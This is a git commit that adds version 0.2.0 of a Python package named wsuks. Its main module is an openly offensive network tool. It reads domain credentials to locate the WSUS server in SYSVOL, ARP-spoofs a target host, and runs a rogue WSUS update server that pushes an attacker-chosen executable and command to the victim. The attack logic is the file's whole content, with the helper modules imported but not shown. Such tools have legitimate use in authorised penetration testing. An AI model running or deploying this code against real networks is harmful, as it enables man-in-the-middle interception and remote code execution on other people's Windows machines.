d40d6da0124763140e18e47a6869b528cdce9291
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 19:08:15 +0000

    Add package wsuks/0.2.0/wsuks-0.2.0-py3-none-any.whl

---
+++ packages/wsuks/wsuks-0.2.0-py3-none-any.whl/wsuks/wsuks.py
@@ -0,0 +1,87 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+from http.server import HTTPServer
+import logging
+import os
+from scapy.all import get_if_addr, sniff
+from wsuks.helpers.arpspoofer import ArpSpoofer
+from wsuks.helpers.logger import initLogger
+from wsuks.helpers.argparser import initParser, printBanner
+from wsuks.helpers.sysvolparser import SysvolParser
+from wsuks.helpers.wsusserver import WSUSUpdateHandler
+
+
+class Wsuks:
+    def __init__(self, args):
+        self.logger = logging.getLogger()
+        self.hostIp = get_if_addr(args.interface)
+
+        # Set args
+        self.targetIp = args.targetIp  # Never None (required)
+        self.executable_file = args.executable.read()
+        self.executable_name = os.path.basename(args.executable.name)
+        args.executable.close()
+        self.command = args.command
+
+        self.wsusIp = args.wsusIp
+        self.wsusPort = args.wsusPort  # Default 8530
+        self.username = args.username
+        self.password = args.password
+        self.domain = args.domain
+        self.dcIp = args.dcIp
+
+    def run(self):
+        # Get the WSUS server IP and Port from the sysvol share
+        sysvolparser = SysvolParser()
+        if not self.wsusIp:
+            self.logger.info("WSUS Server not specified, trying to find it in SYSVOL share on DC")
+            self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.username, self.password, self.dcIp)
+        else:
+            self.logger.info(f"WSUS Server specified manually: {self.wsusIp}:{self.wsusPort}")
+
+        # Start Arp Spoofing
+        arpspoofer = ArpSpoofer()
+        arpspoofer.start(self.targetIp, "192.168.0.1")
+
+        # Prepare WSUS Update Handler
+        # sniff(filter="tcp and port 8530", prn=self.handlePacket, store=0)
+        update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}', self.logger)
+        update_handler.set_resources_xml(self.command)
+
+        self.logger.debug(update_handler)
+
+        # Prepare WSUS HTTP Server
+        http_server = HTTPServer((self.hostIp, self.wsusPort), update_handler)
+        try:
+            self.logger.info(f"Starting WSUS Server on {self.hostIp}:{self.wsusPort}...")
+            http_server.serve_forever()
+        except KeyboardInterrupt:
+            print("")
+            self.logger.info("Stopping WSUS Server...")
+        finally:
+            arpspoofer.stop()
+
+    def handlePacket(self, packet):
+        packet.show()
+
+
+def main():
+    # Setup
+    printBanner()
+    args = initParser()
+
+    initLogger(debug=args.debug)
+    logger = logging.getLogger('wsuks')
+    logger.debug(args)
+    
+    # Prevent scapy from logging to console
+    scapyLogger = logging.getLogger('scapy')
+    scapyLogger.handlers.clear()
+
+    wsuks = Wsuks(args)
+    wsuks.run()
+
+
+if __name__ == '__main__':
+    main()
